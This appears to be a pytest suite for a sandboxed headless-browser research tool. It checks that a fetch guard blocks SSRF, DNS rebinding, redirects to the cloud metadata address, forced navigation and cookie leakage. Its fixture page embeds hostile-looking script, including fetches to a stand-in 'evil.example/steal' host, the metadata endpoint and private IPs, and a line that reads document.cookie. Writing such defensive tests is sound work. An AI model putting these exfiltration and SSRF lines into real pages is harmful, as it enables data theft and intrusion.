"""The browser research kernel in a real Chromium (marker ``browser``; docs/browser-research.md).

Deselected unless the ``-m`` expression names ``browser`` (the "Browser research kernel" CI
job installs Playwright and Chromium and runs them; none may be skipped there). Pages are
served by a mock transport behind fake DNS, so every byte the browser sees came through the
gate, and the record of dialled addresses proves nothing else was contacted.
"""

from __future__ import annotations

import asyncio
import os
from typing import Any

import httpx
import pytest

from anum_api.browser_research.guard import PinnedFetcher
from anum_api.browser_research.kernel import Limits, browse, chromium_available

pytestmark = pytest.mark.browser

EXECUTABLE = os.environ.get("ANUM_TEST_CHROMIUM_PATH") or None


class Web:
    def __init__(self) -> None:
        self.dns: dict[str, list[list[str]]] = {
            "site.example": [["93.184.215.14"]], "cdn.example": [["93.184.215.15"]],
            "evil.example": [["10.0.0.5"]], "meta.example": [["169.254.169.254"]],
        }
        self.dialled: list[tuple[str, str, str, str]] = []  # (method, Host, address, path)
        self.pages: dict[tuple[str, str], httpx.Response] = {}

    async def resolve(self, host: str, port: int) -> list[str]:
        answers = self.dns.get(host)
        if not answers:
            raise OSError("no such host")
        return answers.pop(0) if len(answers) > 1 else answers[0]

    def handler(self, request: httpx.Request) -> httpx.Response:
        host = request.headers["host"]
        self.dialled.append((request.method, host, request.url.host, request.url.path))
        if request.url.path == "/robots.txt" and (host, "/robots.txt") not in self.pages:
            return httpx.Response(404)
        return self.pages.get((host, request.url.path), httpx.Response(404))

    def read(self, url: str, **limits: Any) -> dict[str, Any]:
        fetcher = PinnedFetcher(resolve=self.resolve, inner=httpx.MockTransport(self.handler), timeout_seconds=5)
        return asyncio.run(browse(url, fetcher=fetcher, limits=Limits(deadline_seconds=25, **limits), executable_path=EXECUTABLE))


def page(body: str, **headers: str) -> httpx.Response:
    return httpx.Response(200, headers={"content-type": "text/html; charset=utf-8", **headers}, text=body)


def test_chromium_is_installed_for_this_job() -> None:
    ok, detail = chromium_available(EXECUTABLE)
    assert ok, detail


def test_reads_a_scripted_page_and_refuses_everything_unsafe_it_tries() -> None:
    web = Web()
    web.pages[("site.example", "/")] = httpx.Response(302, headers={"location": "/home"})
    web.pages[("site.example", "/home")] = page(
        """<title>Home  page</title><h1>Welcome</h1>
        <a href="/about">About us</a><a href="http://site.example/plain">plain</a><a href="javascript:alert(1)">js</a>
        <img src="https://evil.example/pixel.png"><iframe src="https://evil.example/frame"></iframe>
        <form method="post" action="https://site.example/submit"><input name="q" value="x"></form>
        <script src="https://cdn.example/app.js"></script>
        <script>
          fetch('https://evil.example/steal').catch(() => {});
          fetch('https://meta.example/latest/meta-data').catch(() => {});
          fetch('https://10.0.0.9/raw').catch(() => {});
          fetch('https://site.example/api', {method: 'POST', body: 'x'}).catch(() => {});
          try { new WebSocket('wss://site.example/socket'); } catch (e) {}
          try { new WebSocket('ws://10.0.0.1:9000/'); } catch (e) {}
          navigator.sendBeacon && navigator.sendBeacon('https://site.example/beacon', 'x');
          document.forms[0].submit();
          document.body.insertAdjacentHTML('beforeend', '<p>cookie=[' + document.cookie + ']</p>');
        </script>""",
        **{"set-cookie": "session=abc; Path=/"},
    )
    web.pages[("cdn.example", "/app.js")] = httpx.Response(
        200, headers={"content-type": "text/javascript"}, text="document.body.insertAdjacentHTML('beforeend', '<p>from the script</p>')"
    )
    result = web.read("https://site.example/")
    assert result["outcome"] == "succeeded", result
    assert result["final_url"] == "https://site.example/home" and result["title"] == "Home page"
    assert "Welcome" in result["text"] and "from the script" in result["text"]
    assert "cookie=[]" in result["text"]  # Set-Cookie never reached the browser
    assert result["links"] == [{"url": "https://site.example/about", "text": "About us"}]
    # Only GETs, only to the two public addresses, only the planned paths.
    assert {(method, address) for method, _, address, _ in web.dialled} <= {("GET", "93.184.215.14"), ("GET", "93.184.215.15")}
    assert {path for *_, path in web.dialled} == {"/robots.txt", "/", "/home", "/app.js"}
    reasons = result["stats"]["blocked_reasons"]
    assert reasons.get("refused_address", 0) >= 3 and reasons.get("method", 0) >= 1
    assert reasons.get("type:image") == 1 and reasons.get("frame") == 1


def test_a_redirect_to_the_metadata_address_is_refused() -> None:
    web = Web()
    web.pages[("site.example", "/")] = httpx.Response(302, headers={"location": "https://meta.example/latest/meta-data/"})
    result = web.read("https://site.example/")
    assert result["outcome"] == "refused_address" and result["final_url"] == "https://meta.example/latest/meta-data/"
    assert [address for *_, address, _ in web.dialled] == ["93.184.215.14", "93.184.215.14"]


def test_a_rebinding_name_is_refused_before_the_page_is_requested() -> None:
    web = Web()
    web.dns["site.example"] = [["93.184.215.14"], ["127.0.0.1"]]
    web.pages[("site.example", "/")] = page("<p>internal admin</p>")
    result = web.read("https://site.example/")
    assert result["outcome"] == "refused_address"
    assert web.dialled == [("GET", "site.example", "93.184.215.14", "/robots.txt")]


def test_the_page_cannot_move_itself_somewhere_else() -> None:
    web = Web()
    web.pages[("site.example", "/")] = page(
        "<p>first</p><meta http-equiv=refresh content='0;url=https://evil.example/'><script>location.href = 'https://site.example/other'</script>"
    )
    web.pages[("site.example", "/other")] = page("<p>other</p>")
    result = web.read("https://site.example/")
    assert result["outcome"] == "succeeded" and result["final_url"] == "https://site.example/"
    assert "/other" not in {path for *_, path in web.dialled}
    assert result["stats"]["blocked_reasons"].get("navigation", 0) >= 1


def test_downloads_are_not_read() -> None:
    web = Web()
    web.pages[("site.example", "/report")] = httpx.Response(200, headers={"content-type": "application/pdf"}, content=b"%PDF-1.7")
    assert web.read("https://site.example/report")["outcome"] == "not_text"


def test_login_pages_are_not_returned() -> None:
    web = Web()
    web.pages[("site.example", "/")] = page("<form><input type=password name=p></form><p>members only</p>")
    result = web.read("https://site.example/")
    assert result["outcome"] == "challenge" and "text" not in result


def test_text_is_cut_to_the_limit() -> None:
    web = Web()
    web.pages[("site.example", "/")] = page("<p>" + "word " * 5000 + "</p>")
    result = web.read("https://site.example/", max_text_chars=500)
    assert result["outcome"] == "succeeded" and len(result["text"]) == 500 and result["truncated"] is True
